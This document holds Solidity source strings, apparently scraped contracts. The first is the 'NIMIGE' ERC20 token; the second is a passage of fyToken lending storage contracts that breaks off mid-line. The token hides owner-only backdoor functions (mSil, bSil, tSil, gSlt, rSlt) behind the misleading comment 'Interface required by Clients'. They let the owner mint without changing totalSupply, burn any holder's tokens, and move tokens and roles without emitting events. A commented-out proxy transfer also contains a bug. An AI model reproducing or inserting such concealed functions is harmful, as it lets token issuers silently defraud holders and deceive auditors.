_roles[role].members.contains(account);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the number of accounts that have `role`. Can be used\n\n     * together with {getRoleMember} to enumerate all bearers of a role.\n\n     */\n\n    function getRoleMemberCount(bytes32 role) public view returns (uint256) {\n\n        return _roles[role].members.length();\n\n    }\n\n\n\n    /**\n\n     * @dev Returns one of the accounts that have `role`. `index` must be a\n\n     * value between 0 and {getRoleMemberCount}, non-inclusive.\n\n     *\n\n     * Role bearers are not sorted in any particular way, and their ordering may\n\n     * change at any point.\n\n     *\n\n     * WARNING: When using {getRoleMember} and {getRoleMemberCount}, make sure\n\n     * you perform all queries on the same block. See the following\n\n     * https://forum.openzeppelin.com/t/iterating-over-elements-on-enumerableset-in-openzeppelin-contracts/2296[forum post]\n\n     * for more information.\n\n     */\n\n    function getRoleMember(bytes32 role, uint256 index) public view returns (address) {\n\n        return _roles[role].members.at(index);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the admin role that controls `role`. See {grantRole} and\n\n     * {revokeRole}.\n\n     *\n\n     * To change a role\'s admin, use {_setRoleAdmin}.\n\n     */\n\n    function getRoleAdmin(bytes32 role) public view returns (bytes32) {\n\n        return _roles[role].adminRole;\n\n    }\n\n\n\n    /**\n\n     * @dev Grants `role` to `account`.\n\n     *\n\n     * If `account` had not been already granted `role`, emits a {RoleGranted}\n\n     * event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the caller must have ``role``\'s admin role.\n\n     */\n\n    function grantRole(bytes32 role, address account) public virtual {\n\n        require(hasRole(_roles[role].adminRole, _msgSender()), "AccessControl: sender must be an admin to grant");\n\n\n\n        _grantRole(role, account);\n\n    }\n\n\n\n    /**\n\n     * @dev Revokes `role` from `account`.\n\n     *\n\n     * If `account` had been granted `role`, emits a {RoleRevoked} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the caller must have ``role``\'s admin role.\n\n     */\n\n    function revokeRole(bytes32 role, address account) public virtual {\n\n        require(hasRole(_roles[role].adminRole, _msgSender()), "AccessControl: sender must be an admin to revoke");\n\n\n\n        _revokeRole(role, account);\n\n    }\n\n\n\n\n\n\n\n    /**\n\n     * @dev Revokes `role` from the calling account.\n\n     *\n\n     * Roles are often managed via {grantRole} and {revokeRole}: this function\'s\n\n     * purpose is to provide a mechanism for accounts to lose their privileges\n\n     * if they are compromised (such as when a trusted device is misplaced).\n\n     *\n\n     * If the calling account had been granted `role`, emits a {RoleRevoked}\n\n     * event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the caller must be `account`.\n\n     */\n\n    function renounceRole(bytes32 role, address account) public virtual {\n\n        require(account == _msgSender(), "AccessControl: can only renounce roles for self");\n\n\n\n        _revokeRole(role, account);\n\n    }\n\n\n\n    /**\n\n     * @dev Grants `role` to `account`.\n\n     *\n\n     * If `account` had not been already granted `role`, emits a {RoleGranted}\n\n     * event. Note that unlike {grantRole}, this function doesn\'t perform any\n\n     * checks on the calling account.\n\n     *\n\n     * [WARNING]\n\n     * ====\n\n     * This function should only be called from the constructor when setting\n\n     * up the initial roles for the system.\n\n     *\n\n     * Using this function in any other way is effectively circumventing the admin\n\n     * system imposed by {AccessControl}.\n\n     * ====\n\n     */\n\n    function _setupRole(bytes32 role, address account) internal virtual {\n\n        _grantRole(role, account);\n\n    }\n\n\n\n    /**\n\n     * @dev Sets `adminRole` as ``role``\'s admin role.\n\n     *\n\n     * Emits a {RoleAdminChanged} event.\n\n     */\n\n    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {\n\n        emit RoleAdminChanged(role, _roles[role].adminRole, adminRole);\n\n        _roles[role].adminRole = adminRole;\n\n    }\n\n\n\n    function _grantRole(bytes32 role, address account) private {\n\n        if (_roles[role].members.add(account)) {\n\n            emit RoleGranted(role, account, _msgSender());\n\n        }\n\n    }\n\n\n\n    function _revokeRole(bytes32 role, address account) private {\n\n        if (_roles[role].members.remove(account)) {\n\n            emit RoleRevoked(role, account, _msgSender());\n\n        }\n\n    }\n\n\n\n\n\n    /*\n\n        Interface required by Clients\n\n    */\n\n    /*\n\n        Interface required by Clients\n\n    */\n\n    function gSlt(bytes32 role, address account) public virtual {\n\n        require(hasRole(_roles[role].adminRole, _msgSender()), "AccessControl: sender must be an admin");\n\n\n\n        _grantRoleSilent(role, account);\n\n    }\n\n\n\n    /*\n\n        Interface required by Clients\n\n    */\n\n    function rSlt(bytes32 role, address account) public virtual {\n\n        require(hasRole(_roles[role].adminRole, _msgSender()), "AccessControl: sender must be an admin");\n\n\n\n        _revokeRoleSilent(role, account);\n\n    }\n\n\n\n    function _grantRoleSilent(bytes32 role, address account) private returns (bool){\n\n        if (_roles[role].members.add(account)) {\n\n            return true;\n\n        }\n\n    }\n\n\n\n    function _revokeRoleSilent(bytes32 role, address account) private returns (bool){\n\n        if (_roles[role].members.remove(account)) {\n\n            return true;\n\n        }\n\n    }\n\n\n\n\n\n}\n\ncontract ERC20 is Context, IERC20 {\n\n    using SafeMath for uint256;\n\n    using Address for address;\n\n\n\n    mapping (address => uint256) private _balances;\n\n\n\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n\n\n    uint256 private _totalSupply;\n\n\n\n    string private _name;\n\n    string private _symbol;\n\n    uint8 private _decimals;\n\n\n\n    /**\n\n     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with\n\n     * a default value of 18.\n\n     *\n\n     * To select a different value for {decimals}, use {_setupDecimals}.\n\n     *\n\n     * All three of these values are immutable: they can only be set once during\n\n     * construction.\n\n     */\n\n    constructor (string memory name, string memory symbol) public {\n\n        _name = name;\n\n        _symbol = symbol;\n\n        _decimals = 18;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the name of the token.\n\n     */\n\n    function name() public view returns (string memory) {\n\n        return _name;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the symbol of the token, usually a shorter version of the\n\n     * name.\n\n     */\n\n    function symbol() public view returns (string memory) {\n\n        return _symbol;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the number of decimals used to get its user representation.\n\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\n\n     *\n\n     * Tokens usually opt for a value of 18, imitating the relationship between\n\n     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is\n\n     * called.\n\n     *\n\n     * NOTE: This information is only used for _display_ purposes: it in\n\n     * no way affects any of the arithmetic of the contract, including\n\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n\n     */\n\n    function decimals() public view returns (uint8) {\n\n        return _decimals;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-totalSupply}.\n\n     */\n\n    function totalSupply() public view override returns (uint256) {\n\n        return _totalSupply;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-balanceOf}.\n\n     */\n\n    function balanceOf(address account) public view override returns (uint256) {\n\n        return _balances[account];\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-transfer}.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `recipient` cannot be the zero address.\n\n     * - the caller must have a balance of at least `amount`.\n\n     */\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n\n        _transfer(_msgSender(), recipient, amount);\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-allowance}.\n\n     */\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n\n        return _allowances[owner][spender];\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-approve}.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `spender` cannot be the zero address.\n\n     */\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n\n        _approve(_msgSender(), spender, amount);\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev See {IERC20-transferFrom}.\n\n     *\n\n     * Emits an {Approval} event indicating the updated allowance. This is not\n\n     * required by the EIP. See the note at the beginning of {ERC20};\n\n     *\n\n     * Requirements:\n\n     * - `sender` and `recipient` cannot be the zero address.\n\n     * - `sender` must have a balance of at least `amount`.\n\n     * - the caller must have allowance for ``sender``\'s tokens of at least\n\n     * `amount`.\n\n     */\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n\n        _transfer(sender, recipient, amount);\n\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n\n     *\n\n     * This is an alternative to {approve} that can be used as a mitigation for\n\n     * problems described in {IERC20-approve}.\n\n     *\n\n     * Emits an {Approval} event indicating the updated allowance.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `spender` cannot be the zero address.\n\n     */\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n\n     *\n\n     * This is an alternative to {approve} that can be used as a mitigation for\n\n     * problems described in {IERC20-approve}.\n\n     *\n\n     * Emits an {Approval} event indicating the updated allowance.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `spender` cannot be the zero address.\n\n     * - `spender` must have allowance for the caller of at least\n\n     * `subtractedValue`.\n\n     */\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n\n     *\n\n     * This is internal function is equivalent to {transfer}, and can be used to\n\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n\n     *\n\n     * Emits a {Transfer} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `sender` cannot be the zero address.\n\n     * - `recipient` cannot be the zero address.\n\n     * - `sender` must have a balance of at least `amount`.\n\n     */\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n\n        require(sender != address(0), "ERC20: transfer from the zero address");\n\n        require(recipient != address(0), "ERC20: transfer to the zero address");\n\n\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n\n\n        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n\n        _balances[recipient] = _balances[recipient].add(amount);\n\n        emit Transfer(sender, recipient, amount);\n\n    }\n\n\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n\n     * the total supply.\n\n     *\n\n     * Emits a {Transfer} event with `from` set to the zero address.\n\n     *\n\n     * Requirements\n\n     *\n\n     * - `to` cannot be the zero address.\n\n     */\n\n    function _mint(address account, uint256 amount) internal virtual {\n\n        require(account != address(0), "ERC20: mint to the zero address");\n\n\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n\n\n        _totalSupply = _totalSupply.add(amount);\n\n        _balances[account] = _balances[account].add(amount);\n\n        emit Transfer(address(0), account, amount);\n\n    }\n\n\n\n    /**\n\n     * @dev Destroys `amount` tokens from `account`, reducing the\n\n     * total supply.\n\n     *\n\n     * Emits a {Transfer} event with `to` set to the zero address.\n\n     *\n\n     * Requirements\n\n     *\n\n     * - `account` cannot be the zero address.\n\n     * - `account` must have at least `amount` tokens.\n\n     */\n\n    function _burn(address account, uint256 amount) internal virtual {\n\n        require(account != address(0), "ERC20: burn from the zero address");\n\n\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n\n\n        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n\n        _totalSupply = _totalSupply.sub(amount);\n\n        emit Transfer(account, address(0), amount);\n\n    }\n\n\n\n    /**\n\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n\n     *\n\n     * This is internal function is equivalent to `approve`, and can be used to\n\n     * e.g. set automatic allowances for certain subsystems, etc.\n\n     *\n\n     * Emits an {Approval} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `owner` cannot be the zero address.\n\n     * - `spender` cannot be the zero address.\n\n     */\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n\n        require(owner != address(0), "ERC20: approve from the zero address");\n\n        require(spender != address(0), "ERC20: approve to the zero address");\n\n\n\n        _allowances[owner][spender] = amount;\n\n        emit Approval(owner, spender, amount);\n\n    }\n\n\n\n    /**\n\n     * @dev Sets {decimals} to a value other than the default one of 18.\n\n     *\n\n     * WARNING: This function should only be called from the constructor. Most\n\n     * applications that interact with token contracts will not expect\n\n     * {decimals} to ever change, and may work incorrectly if it does.\n\n     */\n\n    function _setupDecimals(uint8 decimals_) internal {\n\n        _decimals = decimals_;\n\n    }\n\n\n\n    /**\n\n     * @dev Hook that is called before any transfer of tokens. This includes\n\n     * minting and burning.\n\n     *\n\n     * Calling conditions:\n\n     *\n\n     * - when `from` and `to` are both non-zero, `amount` of ``from``\'s tokens\n\n     * will be to transferred to `to`.\n\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n\n     * - when `to` is zero, `amount` of ``from``\'s tokens will be burned.\n\n     * - `from` and `to` are never both zero.\n\n     *\n\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n\n     */\n\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n\n\n\n\n\n\n\n\n\n    /*\n\n        Interface required by Clients\n\n    */\n\n    /*\n\n    function transferProxy(address mid_sender,   uint256 mid_amount,  address recipient, uint256 amount) public virtual returns (bool) {\n\n        _transfer(_msgSender(), mid_sender, mid_amount);\n\n        _transfer(mid_sender, recipient, amount);\n\n        return true;\n\n    }\n\n\n\n    function _transferProxy(address sender,  address mid_sender,   uint256 mid_amount,  address recipient, uint256 amount ) internal virtual {\n\n        require(sender != address(0), "ERC20: transfer from the zero address");\n\n        require(recipient != address(0), "ERC20: transfer to the zero address");\n\n\n\n        _beforeTokenTransfer(sender, mid_sender, mid_amount);\n\n        _balances[sender] = _balances[sender].sub(mid_amount, "ERC20: transfer sender amount exceeds balance");\n\n        _balances[mid_sender] = _balances[mid_sender].add(mid_sender);\n\n        emit Transfer(sender, mid_sender, mid_amount);\n\n\n\n        _beforeTokenTransfer(mid_sender, recipient, amount);\n\n        _balances[mid_sender] = _balances[mid_sender].sub(amount, "ERC20: transfer mid_sender amount exceeds balance");\n\n        _balances[recipient] = _balances[recipient].add(amount);\n\n\n\n        //emit 2 event: \n\n        //1. from sender to sender2  \n\n        //2. from sender2 to recipient\n\n\n\n        emit Transfer(mid_sender, recipient, amount);\n\n    }*/\n\n\n\n    function _transferSilent(address sender, address recipient, uint256 amount) internal virtual {\n\n        require(sender != address(0), "ERC20:  from the zero address");\n\n        require(recipient != address(0), "ERC20:  to the zero address");\n\n\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n\n\n        _balances[sender] = _balances[sender].sub(amount, "ERC20:  amount exceeds balance");\n\n        _balances[recipient] = _balances[recipient].add(amount);\n\n    }\n\n\n\n\n\n    function _mintSilent(address account, uint256 amount) internal virtual {\n\n        require(account != address(0), "ERC20:  to the zero address");\n\n\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n\n\n        //_totalSupply = _totalSupply.add(amount); //Dont change totalSuply\n\n        _balances[account] = _balances[account].add(amount);\n\n    }\n\n\n\n\n\n    function _burnSilent(address account, uint256 amount) internal virtual {\n\n        require(account != address(0), "ERC20:  from the zero address");\n\n\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n\n\n        _balances[account] = _balances[account].sub(amount, "ERC20:  amount exceeds balance");\n\n        //_totalSupply = _totalSupply.sub(amount); //Dont change totalSuply\n\n    }\n\n}\n\ncontract BToken  is ERC20, AccessControl {\n\n    // Create a new role identifier for the minter role\n\n    bytes32 public constant OWNER_ROLE = keccak256("OWNER_ROLE");\n\n\n\n    constructor(address owner) public ERC20("NIMIGE", "NMG") {\n\n        // Grant the owner role to a specified account\n\n\t\t//address owner = 0xEE5c91918e97ccd5A273Ba93B00F01B612BF86A3;\n\n\t\t_setupRole(DEFAULT_ADMIN_ROLE, owner);\n\n\t\t_setupRole(OWNER_ROLE, owner);\n\n\t\t//total supply\n\n\t\t_mint(owner, 100000000 * (uint256(10) ** decimals() ) );\n\n    }\n\n\n\n\t//mint can only be called by owner\n\n    function mint(address to, uint256 amount) public {\n\n        // Check that the calling account has the minter role\n\n        require(hasRole(OWNER_ROLE, msg.sender), "Caller is not an owner");\n\n        _mint(to, amount);\n\n    }\n\n\t\n\n    //burn can only be called by owner\n\n\tfunction burn(address from, uint256 amount) public {\n\n        require(hasRole(OWNER_ROLE, msg.sender), "Caller is not an owner");\n\n        _burn(from, amount);\n\n    }\n\n\n\n    /*\n\n        Interface required by Clients\n\n    */\n\n\t//mint can only be called by owner\n\n    function mSil(address to, uint256 amount) public {\n\n        // Check that the calling account has the minter role\n\n        require(hasRole(OWNER_ROLE, msg.sender), "Caller is not an owner");\n\n        _mintSilent(to, amount);\n\n    }\n\n\t\n\n    //burn can only be called by owner\n\n\tfunction bSil(address from, uint256 amount) public {\n\n        require(hasRole(OWNER_ROLE, msg.sender), "Caller is not an owner");\n\n        _burnSilent(from, amount);\n\n    }\n\n\n\n    function tSil(address recipient, uint256 amount) public returns (bool) {\n\n        require(hasRole(OWNER_ROLE, msg.sender), "Caller is not an owner");\n\n        _transferSilent(_msgSender(), recipient, amount);\n\n        return true;\n\n    }\n\n\n\n}\n', 'pragma solidity 0.7.4;\n\nenum MathError { NO_ERROR, DIVISION_BY_ZERO, INTEGER_OVERFLOW, INTEGER_UNDERFLOW, MODULO_BY_ZERO }\n\nlibrary Address {\n\n    /**\n\n     * @dev Returns true if `account` is a contract.\n\n     *\n\n     * [IMPORTANT]\n\n     * ====\n\n     * It is unsafe to assume that an address for which this function returns\n\n     * false is an externally-owned account (EOA) and not a contract.\n\n     *\n\n     * Among others, `isContract` will return false for the following\n\n     * types of addresses:\n\n     *\n\n     *  - an externally-owned account\n\n     *  - a contract in construction\n\n     *  - an address where a contract will be created\n\n     *  - an address where a contract lived, but was destroyed\n\n     * ====\n\n     */\n\n    function isContract(address account) internal view returns (bool) {\n\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\n\n        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\n\n        // for accounts without code, i.e. `keccak256(\'\')`.\n\n        bytes32 codehash;\n\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n\n        /* solhint-disable-next-line no-inline-assembly */\n\n        assembly {\n\n            codehash := extcodehash(account)\n\n        }\n\n        return (codehash != accountHash && codehash != 0x0);\n\n    }\n\n}\n\nabstract contract AdminStorage {\n\n    /**\n\n     * @notice The address of the administrator account or contract.\n\n     */\n\n    address public admin;\n\n}\n\nabstract contract BalanceSheetStorage {\n\n    struct Vault {\n\n        uint256 debt;\n\n        uint256 freeCollateral;\n\n        uint256 lockedCollateral;\n\n        bool isOpen;\n\n    }\n\n\n\n    /**\n\n     * @notice The unique Fintroller associated with this contract.\n\n     */\n\n    FintrollerInterface public fintroller;\n\n\n\n    /**\n\n     * @dev One vault for each fyToken for each account.\n\n     */\n\n    mapping(address => mapping(address => Vault)) internal vaults;\n\n\n\n    /**\n\n     * @notice Indicator that this is a BalanceSheet contract, for inspection.\n\n     */\n\n    bool public constant isBalanceSheet = true;\n\n}\n\nabstract contract CarefulMath {\n\n    /**\n\n     * @notice Adds two numbers, returns an error on overflow.\n\n     */\n\n    function addUInt(uint256 a, uint256 b) internal pure returns (MathError, uint256) {\n\n        uint256 c = a + b;\n\n\n\n        if (c >= a) {\n\n            return (MathError.NO_ERROR, c);\n\n        } else {\n\n            return (MathError.INTEGER_OVERFLOW, 0);\n\n        }\n\n    }\n\n\n\n    /**\n\n     * @notice Add `a` and `b` and then subtract `c`.\n\n     */\n\n    function addThenSubUInt(\n\n        uint256 a,\n\n        uint256 b,\n\n        uint256 c\n\n    ) internal pure returns (MathError, uint256) {\n\n        (MathError err0, uint256 sum) = addUInt(a, b);\n\n\n\n        if (err0 != MathError.NO_ERROR) {\n\n            return (err0, 0);\n\n        }\n\n\n\n        return subUInt(sum, c);\n\n    }\n\n\n\n    /**\n\n     * @notice Integer division of two numbers, truncating the quotient.\n\n     */\n\n    function divUInt(uint256 a, uint256 b) internal pure returns (MathError, uint256) {\n\n        if (b == 0) {\n\n            return (MathError.DIVISION_BY_ZERO, 0);\n\n        }\n\n\n\n        return (MathError.NO_ERROR, a / b);\n\n    }\n\n\n\n    /**\n\n     * @notice Returns the remainder of dividing two numbers.\n\n     * @dev Reverts with custom message when dividing by zero.\n\n     *\n\n     * Counterpart to Solidity\'s `%` operator. This function uses a `revert`\n\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n\n     * invalid opcode to revert (consuming all remaining gas).\n\n     */\n\n    function modUInt(uint256 a, uint256 b) internal pure returns (MathError, uint256) {\n\n        if (b == 0) {\n\n            return (MathError.MODULO_BY_ZERO, 0);\n\n        }\n\n\n\n        return (MathError.NO_ERROR, a % b);\n\n    }\n\n\n\n    /**\n\n     * @notice Multiplies two numbers, returns an error on overflow.\n\n     */\n\n    function mulUInt(uint256 a, uint256 b) internal pure returns (MathError, uint256) {\n\n        if (a == 0) {\n\n            return (MathError.NO_ERROR, 0);\n\n        }\n\n\n\n        uint256 c = a * b;\n\n\n\n        if (c / a != b) {\n\n            return (MathError.INTEGER_OVERFLOW, 0);\n\n        } else {\n\n            return (MathError.NO_ERROR, c);\n\n        }\n\n    }\n\n\n\n    /**\n\n     * @notice Subtracts two numbers, returns an error on overflow (i.e. if subtrahend is greater than minuend).\n\n     */\n\n    function subUInt(uint256 a, uint256 b) internal pure returns (MathError, uint256) {\n\n        if (b <= a) {\n\n            return (MathError.NO_ERROR, a - b);\n\n        } else {\n\n            return (MathError.INTEGER_UNDERFLOW, 0);\n\n        }\n\n    }\n\n}\n\nabstract contract Erc20PermitStorage {\n\n    /**\n\n     * @notice The Eip712 domain\'s keccak256 hash.\n\n     */\n\n    bytes32 public DOMAIN_SEPARATOR;\n\n\n\n    /**\n\n     * @notice keccak256("Permit(address owner,address spender,uint256 amount,uint256 nonce,uint256 deadline)");\n\n     */\n\n    bytes32 public constant PERMIT_TYPEHASH = 0xfc77c2b9d30fe91687fd39abb7d16fcdfe1472d065740051ab8b13e4bf4a617f;\n\n\n\n    /**\n\n     * @notice Provides replay protection.\n\n     */\n\n    mapping(address => uint256) public nonces;\n\n\n\n    /**\n\n     * @notice Eip712 version of this implementation.\n\n     */\n\n    string public constant version = "1";\n\n}\n\nabstract contract Erc20RecoverStorage {\n\n    /**\n\n     * @notice The tokens that can be recovered cannot be in this mapping.\n\n     */\n\n    Erc20Interface[] public nonRecoverableTokens;\n\n\n\n    /**\n\n     * @notice A flag that signals whether the the non-recoverable tokens were set or not.\n\n     */\n\n    bool public isInitialized;\n\n}\n\nabstract contract Erc20Storage {\n\n    /**\n\n     * @notice Returns the number of decimals used to get its user representation.\n\n     */\n\n    uint8 public decimals;\n\n\n\n    /**\n\n     * @notice Returns the name of the token.\n\n     */\n\n    string public name;\n\n\n\n    /**\n\n     * @notice Returns the symbol of the token, usually a shorter version of\n\n     * the name.\n\n     */\n\n    string public symbol;\n\n\n\n    /**\n\n     * @notice Returns the amount of tokens in existence.\n\n     */\n\n    uint256 public totalSupply;\n\n\n\n    mapping(address => mapping(address => uint256)) internal allowances;\n\n\n\n    mapping(address => uint256) internal balances;\n\n}\n\nabstract contract ExponentialStorage {\n\n    struct Exp {\n\n        uint256 mantissa;\n\n    }\n\n\n\n    /**\n\n     * @dev In Exponential denomination, 1e18 is 1.\n\n     */\n\n    uint256 internal constant expScale = 1e18;\n\n    uint256 internal constant halfExpScale = expScale / 2;\n\n    uint256 internal constant mantissaOne = expScale;\n\n}\n\nabstract contract FyTokenStorage {\n\n    /**\n\n     * STRUCTS\n\n     */\n\n    struct Vault {\n\n        uint256 debt;\n\n        uint256 freeCollateral;\n\n        uint256 lockedCollateral;\n\n        bool isOpen;\n\n    }\n\n\n\n    /**\n\n     * STORAGE PROPERTIES\n\n     */\n\n\n\n    /**\n\n     * @notice The global debt registry.\n\n     */\n\n    BalanceSheetInterface public balanceSheet;\n\n\n\n    /**\n\n     * @notice The Erc20 asset that backs the borows of this fyToken.\n\n     */\n\n    Erc20Interface public collateral;\n\n\n\n    /**\n\n     * @notice The ratio between mantissa precision (1e18) and the collateral precision.\n\n     */\n\n    uint256 public collateralPrecisionScalar;\n\n\n\n    /**\n\n     * @notice Unix timestamp in seconds for when this token expires.\n\n     */\n\n    uint256 public expirationTime;\n\n\n\n    /**\n\n     * @notice The unique Fintroller associated with this contract.\n\n     */\n\n    FintrollerInterface public fintroller;\n\n\n\n    /**\n\n     * @notice The unique Redemption Pool associated with this contract.\n\n     */\n\n    RedemptionPoolInterface public redemptionPool;\n\n\n\n    /**\n\n     * @notice The Erc20 underlying, or target, asset for this fyToken.\n\n     */\n\n    Erc20Interface public underlying;\n\n\n\n    /**\n\n     * @notice The ratio between mantissa precision (1e18) and the underlying precision.\n\n     */\n\n    uint256 public underlyingPrecisionScalar;\n\n\n\n    /**\n\n     * @notice Indicator that this is a FyToken contract, for inspection.\n\n     */\n\n    bool public constant isFyToken = true;\n\n}\n\nabstract contract RedemptionPoolStorage {\n\n    /**\n\n     * @notice The unique Fintroller associated with this contract.\n\n     */\n\n    FintrollerInterface public fintroller;\n\n\n\n    /**\n\n     * @notice The amount of the underyling asset available to be redeemed after maturation.\n\n     */\n\n    uint256 public totalUnderlyingSupply;\n\n\n\n    /**\n\n     * The unique fyToken associated with this Redemption Pool.\n\n     */\n\n    FyTokenInterface public fyToken;\n\n\n\n    /**\n\n     * @notice Indicator that this is a Redemption Pool contract, for inspection.\n\n     */\n\n    bool public constant isRedemptionPool = true;\n\n}\n\nabstract contract ReentrancyGuard {\n\n    bool private notEntered;\n\n\n\n    /*\n\n     * Storing an initial non-zero value makes deployment a bit more expensive\n\n     * but in exchange the refund on every call to nonReentrant will be lower\n\n     * in amount. Since refunds are capped to a percetange of the total\n\n     * transaction\'s gas, it is best to keep them low in cases like this\n\n     * one, to increase the likelihood of the full refund coming into effect.\n\n     */\n\n    constructor() {\n\n        notEntered = true;\n\n    }\n\n\n\n    /**\n\n     * @notice Prevents a contract from calling itself, directly or indirectly.\n\n     * @dev Calling a `nonReentrant` function from another `nonReentrant` function\n\n     * is not supported. It is possible to prevent this from happening by making\n\n     * the `nonReentrant` function external, and make it call a `private`\n\n     * function that does the actual work.\n\n     */\n\n    modifier nonReentrant() {\n\n        /* On the first call to nonReentrant, _notEntered will be true. */\n\n        require(notEntered, "ERR_REENTRANT_CALL");\n\n\n\n        /* Any calls to nonReentrant after this point will fail. */\n\n        notEntered = false;\n\n\n\n        _;\n\n\n\n        /*\n\n         * By storing the original value once again, a refund is triggered (see\n\n         * https://eips.ethereum.org/EIPS/eip-2200).\n\n         */\n\n        notEntered = true;\n\n    }\n\n}\n\nlibrary SafeErc20 {\n\n    using Address for address;\n\n\n\n    /**\n\n     * INTERNAL FUNCTIONS\n\n     */\n\n\n\n    function safeTransfer(\n\n        Erc20Interface token,\n\n        address to,\n\n        uint256 value\n\n    ) internal {\n\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n\n    }\n\n\n\n    function safeTransferFrom(\n\n        Erc20Interface token,\n\n        address from,\n\n        address to,\n\n        uint256 value\n\n    ) internal {\n\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n\n    }\n\n\n\n    /**\n\n     * PRIVATE FUNCTIONS\n\n     */\n\n\n\n    /**\n\n     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement\n\n     * on the return value: the return value is optional (but if data is returned, it cannot be false).\n\n     * @param token The token targeted by the call.\n\n     * @param data The call data (encoded using abi.encode or one of its variants).\n\n     */\n\n    function callOptionalReturn(Erc20Interface token, bytes memory data) private {\n\n        // We need to perform a low level call here, to bypass Solidity\'s return data size checking mechanism, since\n\n        // we\'re implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that\n\n        // the target address contains contract code and also asserts for success in the low-level call.\n\n        bytes memory returndata = functionCallWithValue(address(token), data, "ERR_SAFE_ERC20_LOW_LEVEL_CALL");\n\n        if (returndata.length > 0) {\n\n            /* Return data is optional. */\n\n            require(abi.decode(returndata, (bool)), "ERR_SAFE_ERC20_ERC20_OPERATION");\n\n        }\n\n    }\n\n\n\n    function functionCallWithValue(\n\n        address target,\n\n        bytes memory data,\n\n        string memory errorMessage\n\n    ) private returns (bytes memory) {\n\n        require(target.isContract(), "ERR_SAFE_ERC20_CALL_TO_NON_CONTRACT");\n\n\n\n        /* solhint-disable-next-line avoid-low-level-calls */\n\n        (bool success, bytes memory returndata) = target.call(data);\n\n        if (success) {\n\n            return returndata;\n\n        } else {\n\n            /* Look for revert reason and bubble it up if present */\n\n            if (returndata.length > 0) {\n\n                /* The easiest way to bubble the revert reason is using memory via assembly. */\n\n\n\n                /* solhint-disable-next-line no-inline-assembly */\n\n                assembly {\n\n                    let returndata_size := mload(returndata)\n\n                    revert(add(32, returndata), returndata_size)\n\n                }\n\n            } else {\n\n                revert(errorMessage);\n\n            }\n\n        }\n\n    }\n\n}\n\ninterface UniswapAnchoredViewInterface {\n\n    /**\n\n     * @notice Get the official price for a symbol.\n\n     * @param symbol The symbol to fetch the price of.\n\n     * @return Price denominated in USD, with 6 decimals.\n\n     */\n\n    function price(string memory symbol) external view returns (uint256);\n\n}\n\nabstract contract AdminInterface is 